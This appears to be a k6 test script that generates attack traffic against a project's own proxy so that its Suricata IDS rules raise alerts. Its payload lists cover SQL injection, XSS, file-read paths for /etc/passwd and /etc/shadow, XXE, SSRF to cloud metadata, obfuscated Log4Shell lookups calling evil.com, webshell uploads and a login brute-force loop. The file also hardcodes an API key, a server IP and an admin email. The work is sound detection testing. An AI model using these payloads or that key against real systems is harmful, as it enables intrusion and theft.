/**
 * Synorix Suricata IDS/IPS Attack Simulation — Suricata-only test
 * Generates sustained attack traffic to trigger Suricata network-layer signatures.
 * Suricata works ASYNC — alerts appear in DB a few seconds after traffic.
 *
 * Usage:
 *   k6 run perf/k6_suricata_test.js
 *
 * Provide JWT to query alert counts in teardown:
 *   k6 run -e JWT=<token> perf/k6_suricata_test.js
 *
 * Admin JWT (sees all Suricata alerts):
 *   k6 run -e JWT=<admin_token> -e USE_ADMIN=true perf/k6_suricata_test.js
 *
 * Override target if needed:
 *   k6 run -e PROXY_URL=http://165.232.166.48:8080/user-proxy \
 *          -e BACKEND_API=http://165.232.166.48:3001/api \
 *          -e API_KEY=<key> \
 *          perf/k6_suricata_test.js
 *
 * NOTE: Suricata alerts appear under the ADMIN account (user_id=3).
 *       Use admin@synorix.com credentials to get the JWT for teardown.
 *       WAF 403s are expected and do NOT affect Suricata detection —
 *       Suricata inspects raw network packets BEFORE the proxy acts.
 */

import http from 'k6/http';
import { check, sleep, group } from 'k6';
import { Counter, Rate, Trend } from 'k6/metrics';

// ─── Config ───────────────────────────────────────────────────────────────────
const PROXY_URL   = (__ENV.PROXY_URL   || 'http://165.232.166.48:8080/user-proxy').replace(/\/$/, '');
const BACKEND_API = (__ENV.BACKEND_API || 'http://165.232.166.48:3001/api');
const API_KEY     = __ENV.API_KEY      || 'nxr_8e57a3aff816e06ff1105d1135abfdc7098fae7c96574afebb3fb45e507fb14b';
const JWT_TOKEN   = __ENV.JWT          || '';
const USE_ADMIN   = (__ENV.USE_ADMIN   || 'false') === 'true';

// ─── Custom Metrics ───────────────────────────────────────────────────────────
const suricataAlerts    = new Counter('suricata_alerts');
const suricataDetected  = new Rate('suricata_detection_rate');
const attacksSent       = new Counter('attacks_sent');
const attackResponseMs  = new Trend('attack_response_ms');

// ─── Test Options ─────────────────────────────────────────────────────────────
// Higher VU count and longer duration to ensure Suricata has enough traffic
// to cross alert thresholds (some Suricata rules require threshold counts).
export const options = {
  scenarios: {
    suricata_attacks: {
      executor: 'ramping-vus',
      startVUs: 1,
      stages: [
        { duration: '20s', target: 10 },  // ramp up quickly
        { duration: '2m',  target: 20 },  // sustained high-volume attack traffic
        { duration: '10s', target: 0  },  // ramp down
      ],
      gracefulRampDown: '5s',
    },
  },
  thresholds: {
    'http_req_failed':   ['rate<0.99'],   // 403s from WAF are not real failures
    'attack_response_ms': ['p(95)<3000'],
    'attacks_sent':      ['count>100'],   // ensure enough traffic was generated
  },
  summaryTrendStats: ['avg', 'min', 'med', 'p(90)', 'p(95)', 'p(99)', 'max'],
};

// ─── Suricata-targeted Payloads ───────────────────────────────────────────────
// Each payload group maps to specific Suricata SIDs in suricata/rules/local.rules.
// WAF may block these (403) — that is fine; Suricata reads packets at the NIC level.
const PAYLOADS = {
  // Suricata sid:2000001 (union select), sid:8000001 (union select HTTP),
  //            sid:8000004 (drop table), sid:8000005 (insert into)
  sqli: [
    "' UNION SELECT username,password FROM users--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "1; DROP TABLE users--",
    "1' AND SLEEP(5)--",
    "1 AND 1=1 UNION SELECT * FROM information_schema.tables--",
    "'; INSERT INTO users(username,password) VALUES('hax','hax')--",
  ],
  // Suricata sid:8000007 (<script> in HTTP), sid:8000031 (eval() in HTTP body)
  xss: [
    '<script>alert(document.cookie)</script>',
    '<script>eval(atob("YWxlcnQoMSk="))</script>',
    '<img src=x onerror=alert(1)>',
    "javascript:eval('alert(1)')",
  ],
  // Suricata sid:10000303 (/etc/passwd), sid:10000304 (/etc/shadow),
  //            sid:10000301 (../), sid:10000316 (/proc/self/environ)
  lfi: [
    '../../../../etc/passwd',
    '../../etc/shadow',
    '/proc/self/environ',
    '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    'php://filter/convert.base64-encode/resource=/etc/passwd',
  ],
  // Suricata sid:5000001 (<!ENTITY SYSTEM), sid:5000002 (DOCTYPE <!ENTITY)
  //            sid:10000501-10000508
  xxe: [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]>',
  ],
  // Suricata sid:4000001 (SSRF internal), sid:10000509-10000512 (169.254/localhost/127.0)
  ssrf: [
    'http://localhost/admin',
    'http://127.0.0.1:3001/api/admin',
    'http://169.254.169.254/latest/meta-data/',
    'http://0.0.0.0:22/',
  ],
  // Suricata sid:10000601 (jndi:ldap://), sid:10000602 (jndi:rmi://),
  //            sid:10000603 (jndi:dns://)
  log4shell: [
    '${jndi:ldap://evil.com/a}',
    '${jndi:rmi://evil.com/a}',
    '${jndi:dns://evil.com/a}',
    '${${lower:j}ndi:${lower:ldap}://evil.com/a}',
    '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}',
  ],
  // Suricata sid:9000007 (dangerous file extensions), sid:9000008 (double extension)
  webshell: [
    'shell.php',
    'c99.php',
    'cmd.asp',
    'shell.jsp',
    'upload.php.jpg',
    'evil.exe',
  ],
  // Suricata sid:9300001 (sqlmap|nikto|acunetix|nessus|burp|zap|w3af)
  //            sid:9000022 (selenium|playwright|puppeteer|headless|phantomjs)
  scannerUA: [
    'sqlmap/1.7.8#stable (https://sqlmap.org)',
    'Nikto/2.1.6 (https://cirt.net/nikto2)',
    'Acunetix/14.0',
    'Nessus/10.4.1',
    'BurpSuitePro/2023.1',
    'ZAP/2.12.0 (OWASP ZAP)',
    'w3af/1.7.6',
    'HeadlessChrome/108.0.5359.94',
    'python-requests/2.28.0',
  ],
  // Suricata sid:1000001 (brute force — multiple POST /login in short time)
  brutePasswords: Array.from({ length: 20 }, (_, i) => `brutepass${i}`),
};

function pick(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

function headers(ua, contentType) {
  return {
    'X-API-Key':    API_KEY,
    'Accept':       'application/json',
    'Content-Type': contentType || 'application/json',
    'User-Agent':   ua || 'k6-synorix-suricata-test/1.0',
  };
}

function send(label, res) {
  attacksSent.add(1);
  attackResponseMs.add(res.timings.duration);
  // Log both blocked and allowed — for Suricata, WAF blocking is irrelevant
  const status = res.status === 403 ? 'WAF-BLOCKED' : `HTTP-${res.status}`;
  console.log(`[${status}] ${label}`);
}

// ─── Attack Functions — each maps to specific Suricata SIDs ───────────────────

// Suricata: sid:2000001, sid:8000001, sid:8000004, sid:8000005
function attackSQLi() {
  group('SQLi → Suricata sid:2000001/8000001/8000004', () => {
    const p = pick(PAYLOADS.sqli);
    send(`SQLi GET`, http.get(
      `${PROXY_URL}/api/users?search=${encodeURIComponent(p)}`,
      { headers: headers(), tags: { suricata_rule: 'sqli' } }
    ));
    send(`SQLi POST`, http.post(
      `${PROXY_URL}/api/auth/login`,
      JSON.stringify({ username: p, password: 'x' }),
      { headers: headers(), tags: { suricata_rule: 'sqli' } }
    ));
  });
}

// Suricata: sid:8000007, sid:8000031
function attackXSS() {
  group('XSS → Suricata sid:8000007/8000031', () => {
    const p = pick(PAYLOADS.xss);
    send(`XSS POST`, http.post(
      `${PROXY_URL}/api/products`,
      JSON.stringify({ name: p, description: 'test' }),
      { headers: headers(), tags: { suricata_rule: 'xss' } }
    ));
  });
}

// Suricata: sid:10000303, sid:10000304, sid:10000301, sid:10000316
function attackLFI() {
  group('LFI → Suricata sid:10000303/10000304/10000316', () => {
    const p = pick(PAYLOADS.lfi);
    send(`LFI GET`, http.get(
      `${PROXY_URL}/api/files?path=${encodeURIComponent(p)}`,
      { headers: headers(), tags: { suricata_rule: 'lfi' } }
    ));
  });
}

// Suricata: sid:5000001, sid:5000002, sid:10000501-10000508
function attackXXE() {
  group('XXE → Suricata sid:5000001/5000002', () => {
    const p = pick(PAYLOADS.xxe);
    send(`XXE POST`, http.post(
      `${PROXY_URL}/api/data`,
      p,
      { headers: headers(null, 'application/xml'), tags: { suricata_rule: 'xxe' } }
    ));
  });
}

// Suricata: sid:4000001, sid:10000509-10000512
function attackSSRF() {
  group('SSRF → Suricata sid:4000001/10000509', () => {
    const p = pick(PAYLOADS.ssrf);
    send(`SSRF POST`, http.post(
      `${PROXY_URL}/api/fetch`,
      JSON.stringify({ url: p }),
      { headers: headers(), tags: { suricata_rule: 'ssrf' } }
    ));
  });
}

// Suricata: sid:10000601, sid:10000602, sid:10000603
function attackLog4Shell() {
  group('Log4Shell → Suricata sid:10000601/10000602/10000603', () => {
    const p = pick(PAYLOADS.log4shell);
    const hdrs = Object.assign({}, headers(), {
      'User-Agent':      p,
      'X-Forwarded-For': p,
      'X-Api-Version':   p,
    });
    send(`Log4Shell headers`, http.get(
      `${PROXY_URL}/api/version`,
      { headers: hdrs, tags: { suricata_rule: 'log4shell' } }
    ));
    // Also send in body
    send(`Log4Shell body`, http.post(
      `${PROXY_URL}/api/data`,
      JSON.stringify({ version: p }),
      { headers: headers(), tags: { suricata_rule: 'log4shell' } }
    ));
  });
}

// Suricata: sid:9000007, sid:9000008
function attackWebshell() {
  group('Webshell → Suricata sid:9000007/9000008', () => {
    const fname = pick(PAYLOADS.webshell);
    send(`Webshell upload`, http.post(
      `${PROXY_URL}/api/upload`,
      JSON.stringify({ filename: fname, content: 'eval(base64_decode("cGhwaW5mbygpOw=="))' }),
      { headers: headers(), tags: { suricata_rule: 'webshell' } }
    ));
  });
}

// Suricata: sid:9300001, sid:9000022
function attackScannerUA() {
  group('Scanner UA → Suricata sid:9300001/9000022', () => {
    const ua = pick(PAYLOADS.scannerUA);
    // Hit several recon paths to ensure the pattern is seen multiple times
    ['/api/version', '/admin', '/.env', '/api/users'].forEach((path) => {
      send(`Scanner UA ${path}`, http.get(
        `${PROXY_URL}${path}`,
        { headers: headers(ua), tags: { suricata_rule: 'scanner_ua' } }
      ));
    });
  });
}

// Suricata: sid:1000001 (brute force — rapid POST /login)
function attackBruteForce() {
  group('Brute Force → Suricata sid:1000001', () => {
    // Send a burst without sleeping to cross Suricata's threshold rule
    for (let i = 0; i < 5; i++) {
      const r = http.post(
        `${PROXY_URL}/api/auth/login`,
        JSON.stringify({ username: 'admin', password: pick(PAYLOADS.brutePasswords) }),
        { headers: headers(), tags: { suricata_rule: 'brute_force' } }
      );
      send(`Brute force #${i + 1}`, r);
    }
  });
}

// ─── Main ─────────────────────────────────────────────────────────────────────
export default function () {
  const rand = Math.random();

  if      (rand < 0.18) attackSQLi();
  else if (rand < 0.30) attackXSS();
  else if (rand < 0.42) attackLFI();
  else if (rand < 0.52) attackXXE();
  else if (rand < 0.62) attackSSRF();
  else if (rand < 0.72) attackLog4Shell();
  else if (rand < 0.80) attackWebshell();
  else if (rand < 0.90) attackScannerUA();
  else                  attackBruteForce();

  sleep(0.1);  // shorter sleep → higher volume → more Suricata alerts
}

// ─── Setup ────────────────────────────────────────────────────────────────────
export function setup() {
  console.log('='.repeat(60));
  console.log('  Synorix Suricata IDS/IPS Attack Simulation');
  console.log(`  Target      : ${PROXY_URL}`);
  console.log(`  API Key     : ${API_KEY.substring(0, 12)}...`);
  console.log(`  JWT present : ${JWT_TOKEN ? 'yes' : 'no — alert count will be skipped'}`);
  console.log(`  Admin mode  : ${USE_ADMIN}`);
  console.log('  NOTE: WAF 403 blocks are expected and irrelevant.');
  console.log('        Suricata reads packets at the NIC level regardless.');
  console.log('='.repeat(60));

  const health = http.get('http://165.232.166.48:8080/health', { headers: { 'X-API-Key': API_KEY } });
  if (health.status === 200) {
    console.log('  [OK] Proxy reachable');
  } else {
    console.warn(`  [WARN] Proxy health check HTTP ${health.status} — continuing anyway`);
  }
  console.log('='.repeat(60));
  return { startTime: new Date().toISOString() };
}

// ─── Teardown — query Suricata alert counts ───────────────────────────────────
export function teardown(data) {
  console.log('\n[INFO] Waiting 10s for Suricata async processing...');
  sleep(10);

  if (!JWT_TOKEN) {
    console.warn('[WARN] No JWT provided — skipping Suricata alert query.');
    console.warn('       Get admin JWT: login as admin@synorix.com in the dashboard');
    console.warn('       Then re-run: k6 run -e JWT=<token> -e USE_ADMIN=true perf/k6_suricata_test.js');
    return;
  }

  const authHdrs = { Authorization: `Bearer ${JWT_TOKEN}`, Accept: 'application/json' };

  // Admin endpoint shows all Suricata alerts across all users
  // User endpoint only shows alerts for that specific user
  const endpoints = USE_ADMIN
    ? [
        `${BACKEND_API}/admin/alerts/aggregated?window=1h`,
        `${BACKEND_API}/security/alerts?alert_type=suricata&limit=1000`,
      ]
    : [
        `${BACKEND_API}/security/alerts?alert_type=suricata&limit=1000`,
      ];

  let found = false;
  for (const url of endpoints) {
    const res = http.get(url, { headers: authHdrs });
    console.log(`[INFO] GET ${url} → HTTP ${res.status}`);
    if (res.status === 200) {
      try {
        const body = JSON.parse(res.body);
        const total =
          body.total ??
          (Array.isArray(body.alerts) ? body.alerts.length : 0) ??
          (Array.isArray(body.groups) ? body.groups.reduce((s, g) => s + (g.count || 1), 0) : 0);
        console.log(`[SURICATA] ${total} IDS alerts found in DB`);
        suricataAlerts.add(total);
        if (total > 0) {
          suricataDetected.add(1);
          found = true;
          // Log top categories if available
          if (Array.isArray(body.alerts) && body.alerts.length > 0) {
            const cats = {};
            body.alerts.forEach((a) => {
              const cat = a.category || a.alert_category || 'unknown';
              cats[cat] = (cats[cat] || 0) + 1;
            });
            console.log('[SURICATA] Alert breakdown:', JSON.stringify(cats));
          }
        }
      } catch (e) {
        console.warn('[WARN] Could not parse alert response:', e);
      }
      break;
    }
  }

  if (!found) {
    console.warn('[WARN] No Suricata alerts found. Possible reasons:');
    console.warn('  1. HOME_NET not set to include 165.232.166.48/32 in suricata.yaml');
    console.warn('  2. Suricata IDS service not running (check: systemctl status suricata)');
    console.warn('  3. Integration service not running (check: systemctl status synorix-suricata-integration)');
    console.warn('  4. Using user JWT but Suricata alerts go to admin only — use -e USE_ADMIN=true');
  }
}

// ─── Summary ──────────────────────────────────────────────────────────────────
export function handleSummary(data) {
  const m       = data.metrics;
  const sent    = m.attacks_sent    ? m.attacks_sent.values.count   : 0;
  const sAlerts = m.suricata_alerts ? m.suricata_alerts.values.count : 0;
  const detRate = m.suricata_detection_rate
    ? (m.suricata_detection_rate.values.rate * 100).toFixed(1) + '%'
    : 'N/A';

  const alertNote = JWT_TOKEN
    ? `  Suricata Alerts (DB)  : ${sAlerts}  (async IDS — network layer)\n` +
      `  Detection triggered   : ${detRate}`
    : `  Suricata Alerts       : N/A — re-run with  -e JWT=<admin_token> -e USE_ADMIN=true\n` +
      `  Admin login           : admin@synorix.com  (in dashboard → DevTools → localStorage.token)`;

  const summary = `
${'='.repeat(60)}
  SYNORIX SURICATA IDS/IPS — ATTACK SIMULATION RESULTS
${'='.repeat(60)}
  Attack packets sent   : ${sent}
${alertNote}
${'='.repeat(60)}
  Suricata SIDs targeted:
    SQLi       sid:2000001, 8000001, 8000004, 8000005
    XSS        sid:8000007, 8000031
    LFI        sid:10000303, 10000304, 10000301, 10000316
    XXE        sid:5000001, 5000002, 10000501-10000508
    SSRF       sid:4000001, 10000509-10000512
    Log4Shell  sid:10000601, 10000602, 10000603
    Webshell   sid:9000007, 9000008
    ScannerUA  sid:9300001, 9000022
    BruteForce sid:1000001
${'='.repeat(60)}
  NOTE: WAF 403 blocks do NOT prevent Suricata from detecting attacks.
        Suricata operates at the network/packet level (not application).
${'='.repeat(60)}
  TIP: Check the admin dashboard for Suricata alerts:
       https://synorix-pied-chi.vercel.app/admin → IDS/IPS Alerts
${'='.repeat(60)}
`;
  console.log(summary);
  return { stdout: summary };
}
